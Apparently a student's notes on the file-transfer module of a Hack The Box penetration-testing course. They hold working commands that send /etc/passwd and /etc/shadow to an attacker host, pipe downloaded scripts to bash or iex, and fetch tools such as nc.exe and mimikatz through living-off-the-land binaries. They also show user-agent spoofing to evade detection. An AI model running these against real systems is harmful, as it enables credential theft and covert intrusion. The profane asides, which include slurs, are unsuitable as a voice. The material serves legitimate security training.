#### Download With Bash (/dev/tcp)
- the `/dev/tcp` device file can be used for simple file downloads
Steps:
1) Connect to the target webserver:
```shell-session
TonyS23@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
```
2) HTTP GET request:
```shell-session
TonyS23@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```
3) Print the response:
```shell-session
TonyS23@htb[/htb]$ cat <&3
```
#### SSH Downloads
- SSH comes with an SCP (secure copy) utility for remote file transfer
- SCP is a CLI utility which allows us to copy from local to remote and vice versa 
Steps:
1) Set up an SSH server locally:
```shell-session
TonyS23@htb[/htb]$ sudo systemctl enable ssh

Synchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.
Executing: /lib/systemd/systemd-sysv-install enable ssh
Use of uninitialized value $service in hash element at /usr/sbin/update-rc.d line 26, <DATA> line 45
...SNIP...
```
2) Start the server:
```shell-session
TonyS23@htb[/htb]$ sudo systemctl start ssh
```
3) Check for SSH listening port:
```shell-session
TonyS23@htb[/htb]$ netstat -lnpt

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - 
```
4) Begin transferring files:
```shell-session
TonyS23@htb[/htb]$ scp username@192.168.49.128:/root/myroot.txt . 
```
- `/root/myroot.txt` from remote is copied to the current folder locally, which is specified by `.`
### Upload Operations
#### Web Upload
Steps:
1) Install `uploadserver` module:
```shell-session
TonyS23@htb[/htb]$ sudo python3 -m pip install --user uploadserver

Collecting uploadserver
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```
2) Create a certificate:
```shell-session
TonyS23@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

Generating a RSA private key
................................................................................+++++
.......+++++
writing new private key to 'server.pem'
-----
```
3) Make a new directory and start the web server:
```shell-session
TonyS23@htb[/htb]$ mkdir https && cd https

TonyS23@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

File upload available at /upload
Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
```
4) Upload files:
```shell-session
TonyS23@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
- `--insecure` is used because we use a self-signed certificate that we trust
#### Other Web Transfer Method
- Linux distributions usually have Python or PHP installed
- Python3 server:
```shell-session
TonyS23@htb[/htb]$ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
- Python2.7 server:
```shell-session
TonyS23@htb[/htb]$ python2.7 -m SimpleHTTPServer

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
- PHP server:
```shell-session
TonyS23@htb[/htb]$ php -S 0.0.0.0:8000

[Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started
```
- Ruby web server:
```shell-session
TonyS23@htb[/htb]$ ruby -run -ehttpd . -p8000

[2022-05-23 09:35:46] INFO  WEBrick 1.6.1
[2022-05-23 09:35:46] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]
[2022-05-23 09:35:46] INFO  WEBrick::HTTPServer#start: pid=1705 port=8000
```
- how to download the file locally from the remote target machine:
```shell-session
TonyS23@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt

--2022-05-20 08:13:05--  http://192.168.49.128:8000/filetotransfer.txt
Connecting to 192.168.49.128:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 0 [text/plain]
Saving to: 'filetotransfer.txt'

filetotransfer.txt                       [ <=>                                                                  ]       0  --.-KB/s    in 0s      

2022-05-20 08:13:05 (0.00 B/s) - ‘filetotransfer.txt’ saved [0/0]
```
==**Note:** When we start a new web server using Python or PHP, it's important to consider that inbound traffic may be blocked. We are transferring a file from our target onto our attack host, but we are not uploading the file.==
#### SCP Upload
- if SSH protocol is present, some allow outbound connections
- how to upload via SCP:
```shell-session
TonyS23@htb[/htb]$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/

htb-student@10.129.86.90's password: 
passwd                                                                                                           100% 3414     6.7MB/s   00:00
```
## Transferring Files with Code
- on ==Linux== we have Python, PHP, Perl and Ruby
- on ==Windows== we can use cscript or mshta to execute JavaScript or VBScript code
### Python
- it can run one-liners directly in the CLI
Python2 download:
```python
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
Python3 download:
```python
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
### PHP
PHP download with `File_get_contents()`:
```php
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```
PHP download with `Fopen()`:
```php
php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```
PHP download and pipe it to Bash:
```php
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```
### Ruby
Ruby download:
```ruby
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```
### Perl
Perl download:
```perl
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```
### JavaScript (Windows)
- first we create a file for example `wget.js` with the content:
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));

```
- next we can use this command in CMD or PowerShell to execute it:
```cmd-session
C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```
==Note: This solution uses `cscript.exe`.==
### VBScript (Windows)
- Microsoft Visual Basic Scripting Edition
- it's in EVERY release of Windows from Windows 98 to the present day
- first we create a file called `wget.vbs` and with the content:
```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```
- now we can download a file using `VBScript` and `cscript.exe`:
```cmd-session
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```
### Upload Operations with Python
- the `requests` module allows us to send HTTP requests
- we can use this to upload files to a Python3 `uploadserver`
- first we start the `uploadserver`:
```shell-session
TonyS23@htb[/htb]$ python3 -m uploadserver 

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
- next we upload the file from the remote machine by using a one-liner:
```shell-session
TonyS23@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```
What is the meaning of the one-liner:
```python
# To use the requests function, we need to import the module first.
import requests 

# Define the target URL where we will upload the file.
URL = "http://192.168.49.128:8000/upload"

# Define the file we want to read, open it and save it in a variable.
file = open("/etc/passwd","rb")

# Use a requests POST request to upload the file. 
r = requests.post(url,files={"files":file})
```
## Miscellaneous File Transfer Methods (Windows)
- we can also use `Netcat`, `Ncat` or even `RDP` and PowerShell sessions
### Netcat
- used for reading and writing to network connections using TCP and UDP
- first we listen on the target machine:
```shell-session
nc -lp 8000 > SharpKatz.exe
```
- this tells Netcat to listen on port 8000 for our file
- next, on our machine, we need to send the file:
```shell-session
nc -q 0 192.168.1.5 < SharpKatz.exe
```
- `-q 0` tells Netcat to close the connection after 0 seconds after the file was transferred
==Note: If we use `Ncat` instead of `Netcat` the flags would be `--recv-only` and `--send-only`.==

- another way is to send a file from the attack host as input:
```shell-session
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```
- and receive it on the victim host:
```shell-session
nc 192.168.49.128 443 > SharpKatz.exe
```
==Note: Don't forget to close the connection on the victim machine.==

- another way is to use `/dev/tcp/` in order to get the file on the victim machine after sending it from local host:
```shell-session
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```
- this will be the command on the victim host
### PowerShell Session File Transfer
- for when HTTP, HTTPS and SMB are NOT available
- in this case we use ==PowerShell Remoting== aka ==WinRM==
- this piece of SHIT only works if you are an ADMINISTRATOR or logged in as a user that is part of the Remote Management Group (the shitty lab gives you just guest access and you can't test if this PIECE OF SHIT WORKS)
### RDP
Two methods:
1) Copy and paste directly (easiest method especially from Windows to Windows)
2) Mount a folder (handy for Linux to Windows)
- let's see how to mount a folder
- first mount a folder on Linux:
```shell-session
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'

OR

xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```
## Protected File Transfers
- sometimes we need to encrypt the data before transferring it
### File Encryption on Windows
```powershell-session
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text" 

Description
-----------
Encrypts the string "Secret Test" and outputs a Base64 encoded ciphertext.
 
.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="
 
Description
-----------
Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text.
 
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin
 
Description
-----------
Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes"
 
.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path file.bin.aes
 
Description
-----------
Decrypts the file "file.bin.aes" and outputs an encrypted file "file.bin"
#>
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".aes"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}
```
- ok so this SHIT (the last part) is an AES encryption and decryption script with a specified key
- this piece of shit only works with Base64 gg
- this is how to use this piece of SHIT:
```powershell-session
PS C:\htb> Import-Module .\Invoke-AESEncryption.ps1

FOR ENCRYPTION:
PS C:\htb> Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt

File encrypted to C:\htb\scan-results.txt.aes
PS C:\htb> ls

    Directory: C:\htb

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/18/2020  12:17 AM           9734 Invoke-AESEncryption.ps1
-a----        11/18/2020  12:19 PM           1724 scan-results.txt
-a----        11/18/2020  12:20 PM           3448 scan-results.txt.aes

AND FOR DECRYPTION FUCK YOU, YOU GET NOTHING!!Q HAhha FUCK THIS MODULE
```
### File Encryption on Linux
- with OpenSSL
- let's encrypt `/etc/passwd` with OpenSSL:
```shell-session
TonyS23@htb[/htb]$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

enter aes-256-cbc encryption password:                                                         
Verifying - enter aes-256-cbc encryption password:              
```
- now let's decrypt it:
```shell-session
TonyS23@htb[/htb]$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd                    

enter aes-256-cbc decryption password:
```
## Catching Files over HTTP/S
- most common protocols allowed through firewall
- the file is encrypted in transit if we use HTTPS
### Nginx - Enabling PUT
- a good alternative for transferring files to Apache is Nginx
- first we create a directory to handle uploaded files:
```shell-session
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
```
- then we change the owner to `www-data`:
```shell-session
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```
- create Nginx configuration file `/etc/nginx/sites-available/upload.conf` with the contents:
```nginx
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```
- then symlink our site to the sites-enabled directory:
```shell-session
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```
- start Nginx:
```shell-session
sudo systemctl restart nginx.service
```
==Note: If we already have a service on port 80 we should delete the Nginx configuration.==
```shell-session
sudo rm /etc/nginx/sites-enabled/default
```
- now we can upload files with cURL:
```shell-session
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```
## Living Off The Land
Living off the Land binaries can be used to perform functions such as:
- Download
- Upload
- Command Execution
- File Read
- File Write
- Bypasses
https://lolbas-project.github.io/# //LOLBAS (for Windows)
https://gtfobins.github.io/ //GTFOBins (for Linux)
### LOLBAS (for Windows)
![[lolbas_upload.jpg]]
Example:
- we need an upload binary for Windows in order to get some files on our local machine
- we can search `/upload` on LOLBAS
- there we see `CertReq.exe` which has the function Download and Upload
- we can then upload a file (in this example `win.ini`) to our local machine:
```cmd-session
C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
```
- but first we need to listen locally for it:
```shell-session
TonyS23@htb[/htb]$ sudo nc -lvnp 8000

listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.1] 53819
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/json
User-Agent: Mozilla/4.0 (compatible; Win32; NDES client 10.0.19041.1466/vb_release_svc_prod1)
Content-Length: 92
Host: 192.168.49.128:8000

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```
==Note: If `CertReq.exe` doesn't work with `-Post` then the version does NOT have it.==
### GTFOBins (for Linux)
![[gtfobins_download.jpg]]
- if we want to search for download or upload binaries we should search with `+file download` and `+file upload`
- let's use OpenSSL
- first we create a certificate locally:
```shell-session
TonyS23@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

Generating a RSA private key
.......................................................................................................+++++
................+++++
writing new private key to 'key.pem'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```
- launch the server locally:
```shell-session
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```
- now we can download files from the victim machine:
```shell-session
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```
==Note: So what these retards (autistii pulii mele sculate) try to say is that first we create an OpenSSL certificate LOCALLY, then we start an OpenSSL SERVER LOCALLY in LISTEN MODE and then we hop on REMOTE to download the files from our LOCAL OPENSSL SERVER. FUCKING RETARDS==
### Other Common Tools
- we can also download files with ==Bitsadmin==:
```powershell-session
PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe

OR

PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```
- ==Certutil== can also be used to download files:
```cmd-session
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```
==Note: We only download files from our local server which serves them.==
## Detection
- **Command-line detection**: Blacklisting is easy to bypass with simple tricks like case obfuscation. Whitelisting takes time but is much more reliable for spotting unusual commands.
- **Client-server negotiation**: Most client-server protocols, like HTTP, use user agents to identify the connecting client (e.g., browser, tool).
- **User agent monitoring**: Organizations can filter legitimate user agents and flag suspicious ones in a SIEM tool.
- **Malicious file transfers**: Often identified by specific user agents or headers used in common HTTP transfer techniques.
#### Invoke-WebRequest - Client
```powershell-session
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe" 
PS C:\htb> Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
```
#### Invoke-WebRequest - Server
```shell-session
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
```
#### WinHttpRequest - Client
```powershell-session
PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.ResponseText
```
#### WinHttpRequest - Server
```shell-session
GET /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
```
#### Msxml2 - Client
```powershell-session
PS C:\htb> $h=New-Object -ComObject Msxml2.XMLHTTP;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.responseText
```
#### Msxml2 - Server
```shell-session
GET /nc.exe HTTP/1.1
Accept: */*
Accept-Language: en-us
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
```
#### Certutil - Client
```cmd-session
C:\htb> certutil -urlcache -split -f http://10.10.10.32/nc.exe 
C:\htb> certutil -verifyctl -split -f http://10.10.10.32/nc.exe
```
#### Certutil - Server
```shell-session
GET /nc.exe HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Accept: */*
User-Agent: Microsoft-CryptoAPI/10.0
```
#### BITS - Client
```powershell-session
PS C:\htb> Import-Module bitstransfer;
PS C:\htb> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
PS C:\htb> $r=gc $env:temp\t;
PS C:\htb> rm $env:temp\t; 
PS C:\htb> iex $r
```
#### BITS - Server
```shell-session
HEAD /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
Accept-Encoding: identity
User-Agent: Microsoft BITS/7.8
```
## Evading Detection
- we can change user agents to the one that is allowed internally
- we can list the user agents:
```powershell-session
PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

Name       : InternetExplorer
User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)

Name       : FireFox
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0

Name       : Chrome
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0
             Safari/534.6

Name       : Opera
User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1

Name       : Safari
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0
             Safari/533.16
```
- then we can make requests with specific user agents:
```powershell-session
PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```
- here we downloaded the `nc.exe` file by using the Chrome user agent
- don't forget to listen locally:
```shell-session
TonyS23@htb[/htb]$ nc -lvnp 80

listening on [any] 80 ...
connect to [10.10.10.32] from (UNKNOWN) [10.10.10.132] 51313
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6
(KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6
Host: 10.10.10.32
Connection: Keep-Alive
```

- another way to evade detection is by using a living off the land binary (misplaced trust binaries)
- one such example is the Intel Graphics Driver for Windows 10 `GfxDownloadWrapper.exe`:
```powershell-session
PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```
- this can be permitted to run on a whitelist and doesn't raise suspicion

- such binaries are useful in Windows and Linux for post-exploitation, we just have to find the one that is allowed and suits our needs

# Useful Links:

https://www.microsoft.com/en-us/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/ //Microsoft Astaroth Attack
https://gist.github.com/HarmJ0y/bb48307ffa663256e239 //PowerShell cradles (scripts/commands)
https://lolbas-project.github.io/# //LOLBAS (for Windows)
https://gtfobins.github.io/ //GRFOBins (for Linux)